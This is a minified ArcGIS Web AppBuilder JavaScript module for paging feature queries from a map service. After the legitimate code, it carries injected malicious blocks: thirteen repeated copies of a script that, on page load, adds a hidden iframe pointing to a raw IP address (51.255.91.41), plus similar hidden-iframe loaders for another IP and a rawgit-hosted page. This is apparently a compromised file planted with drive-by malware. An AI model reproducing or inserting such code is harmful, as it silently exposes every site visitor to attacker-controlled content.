// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred esri/tasks/query esri/tasks/QueryTask jimu/utils jimu/dijit/Message".split(" "),function(g,f,n,h,k,l,p,q){function m(){return{url:"",layerInfo:null,limit:1E4,spatialReference:null,queryType:-1,objectIdField:"",query:{maxRecordCount:1E3,where:"",geometry:null,relationship:k.SPATIAL_REL_INTERSECTS,outFields:["*"],nextIndex:0,allCount:0,objectIds:[],features:[]}}}g=g(null,{currentAttrs:null,constructor:function(a){this.currentAttrs=
m();this.currentAttrs.url=a.url;this.currentAttrs.layerInfo=a.layerInfo;this.currentAttrs.spatialReference=a.spatialReference;this.currentAttrs.query.where=a.where;this.currentAttrs.query.geometry=a.geometry;this.currentAttrs.query.maxRecordCount=a.layerInfo.maxRecordCount||1E3;this.currentAttrs.queryType=this._getQueryType(a.layerInfo);this.currentAttrs.objectIdField=p.getObjectIdField(a.layerInfo);a.relationship&&(this.currentAttrs.query.relationship=a.relationship);a.outFields&&(this.currentAttrs.query.outFields=
a.outFields);if(0<a.limit||a.limit>this.currentAttrs.query.maxRecordCount)this.currentAttrs.limit=a.limit},getFeatures:function(){var a=new h,a=this.currentAttrs.query.where,b=this.currentAttrs.query.geometry,d=this.currentAttrs.query.relationship;return a=2===this.currentAttrs.queryType?this._getAllFeatures_SupportObjectIds(a,b,d):this._getAllFeatures_NotSupportObjectIds(a,b,d)},_getQueryType:function(a){var b=-1;return b=this._isSupportObjectIds(a)?2:3},_isSupportObjectIds:function(a){var b=0;a.currentVersion&&
(b=parseFloat(a.currentVersion));return 10<=b||a.hasOwnProperty("typeIdField")},_getAllFeatures_SupportObjectIds:function(a,b,d){return this._queryIds(a,b,d).then(f.hitch(this,function(a){if(!(a&&0<a.length))return this.currentAttrs.query.allCount=0,{status:1,count:0,features:[]};var b=a.length;this.currentAttrs.query.allCount=b;this.currentAttrs.query.objectIds=a;this.currentAttrs.query.nextIndex=0;return b>this.currentAttrs.query.maxRecordCount?this._isContinue().then(f.hitch(this,function(a){return a?
this._onResultsScroll_SupportObjectIds():{status:-1,count:b,features:[]}})):this._onResultsScroll_SupportObjectIds()}))},_isContinue:function(){var a=new h,b=window.jimuNls.queryFeatures,d=new q({message:b.tooManyFeaturesTip+" "+b.askForContinue,buttons:[{label:window.jimuNls.common.continue1,onClick:f.hitch(this,function(){a.resolve(!0);d.close()})},{label:window.jimuNls.common.cancel,onClick:f.hitch(this,function(){a.resolve(!1);d.close()})}]});return a},_onResultsScroll_SupportObjectIds:function(){var a=
new h,b=this.currentAttrs.query.objectIds,d=this.currentAttrs.query.allCount,c=this.currentAttrs.query.nextIndex,e=this.currentAttrs.query.maxRecordCount,r=this.currentAttrs.query.relationship;if(c>=d)return a.resolve({status:1,count:d,features:this.currentAttrs.query.features}),a;b=b.slice(c,c+Math.min(b.length-c,e));return 0===b.length?(a.resolve({status:1,count:d,features:this.currentAttrs.query.features}),a):this._queryByObjectIds(b,!0,r).then(f.hitch(this,function(a){a=a.features;this.currentAttrs.query.nextIndex+=
a.length;this.currentAttrs.query.features=this.currentAttrs.query.features.concat(a);return this._onResultsScroll_SupportObjectIds()}))},_getAllFeatures_NotSupportObjectIds:function(a,b,d){return this._doQuery_NotSupportObjectIds(a,b,d).then(f.hitch(this,function(a){return{status:1,count:a.length,features:a}}))},_doQuery_NotSupportObjectIds:function(a,b,d){var c=new h;this._query(a,b,!0,d).then(f.hitch(this,function(a){a=a.features;this.currentAttrs.query.allCount=a.length;c.resolve(a)}),f.hitch(this,
function(a){console.error(a);c.reject(a)}));return c},_getOutputFields:function(){return["*"]},_query:function(a,b,d,c){var e=new k;e.where=a;b&&(e.geometry=b);e.outSpatialReference=this.currentAttrs.spatialReference;e.returnGeometry=!!d;e.spatialRelationship=c;e.outFields=this._getOutputFields();return(new l(this.currentAttrs.url)).execute(e)},_queryIds:function(a,b,d){var c=new k;c.where=a;b&&(c.geometry=b);c.returnGeometry=!1;c.spatialRelationship=d;c.outSpatialReference=this.currentAttrs.spatialReference;
return(new l(this.currentAttrs.url)).executeForIds(c)},_queryByObjectIds:function(a,b,d){var c=new h,e=new k;e.returnGeometry=!!b;e.outSpatialReference=this.currentAttrs.spatialReference;e.outFields=this._getOutputFields();e.objectIds=a;e.spatialRelationship=d;(new l(this.currentAttrs.url)).execute(e).then(f.hitch(this,function(a){c.resolve(a)}),f.hitch(this,function(e){if(400===e.code){var h=this.currentAttrs.objectIdField,g="",k=a.length;n.forEach(a,f.hitch(this,function(a,b){g+=h+" \x3d "+a;b!==
k-1&&(g+=" OR ")}));this._query(g,null,b,d).then(f.hitch(this,function(a){c.resolve(a)}),f.hitch(this,function(a){c.reject(a)}))}else c.reject(e)}));return c}});g.getCleanCurrentAttrsTemplate=m;return g});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});